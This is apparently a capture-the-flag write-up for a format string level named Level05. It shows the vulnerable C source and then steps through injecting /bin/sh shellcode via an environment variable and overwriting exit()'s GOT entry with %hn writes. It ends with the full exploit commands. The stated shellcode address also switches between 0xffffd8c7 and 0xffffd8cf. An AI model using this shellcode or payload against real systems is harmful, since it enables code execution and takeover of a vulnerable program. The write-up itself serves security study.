# Level05

## Code

```
#include <stdio.h>
#include <stdlib.h>

int     main(void)
{
  char s[100];
  unsigned int i;

  i = 0;
  fgets(s, 100, stdin);
  for ( i = 0; i < strlen(s); ++i )
  {
    if ( s[i] > 64 && s[i] <= 90 )
      s[i] ^= 0x20u;
  }
  printf(s);
  exit(0);
}
```
## Explanation

- We saw a non protected printf so we decided to export a shellcode in the env and to call it thanks to `printf`. \
```
$  export EXPLOIT=`python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'
```

- We need to put the value of the address of our shellcode `0xffffd8c7` stored in the env at the address of the GOT entry of `exit()` to win.

- What happens if you give printf() a string with format specifiers but no arguments ? Well, the
    function will try to get the arguments where they should be in the memory anyway, so this is
    something we can exploit.

- After playing with this idea for a bit, we tried to give the program this input : \
    `aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x`
- We got this output : \
    `aaaa 64 f7fcfac0 f7ec3af9 ffffd6af ffffd6ae 0 ffffffff ffffd734 f7fdb000 61616161 20782520 25207825 78252078`

- Here it's quite easy to notice where our format string's buffer starts, technically we could use as many %X as we want to go back up in the stack's addresses to read whatever we want to.

- `printf()` has a format specifier that allows us to write at a specific address : %n
    %n writes the number of characters written so far at the variable address you give as argument.

- So technically, if we could write `0xffffd8c7` characters and then insert a %n whose argument is the address of exit()'s GOT entry `0x080497e0`, that would be perfect.

- The test we did earlier with AAAA helped us understand the beginning of the buffer corresponded to the 10th "%x" we gave as input, but we still have one problem: 0xffffd8cf, 4294957263 in decimal, is a far too big number to use as is, and even with the "%<paddingN>x%" syntax, we couldn't write the desired value in one shot.

- So we discovered the %hn specifier which allows us to write in in two parts, by blocks of 2 bytes instead of 4. So we had to write 0xd8c7 at the address of `exit()`'s got entry and 0xffff two bytes further.

- Knowing all that, here's our final payload :


## Exploit
```
$  export EXPLOIT=`python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`
$ /tmp/getenv 
0xffffd8c7
$  (python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55487x%10$hn%10040x%11$hn"';cat) | ./level05
```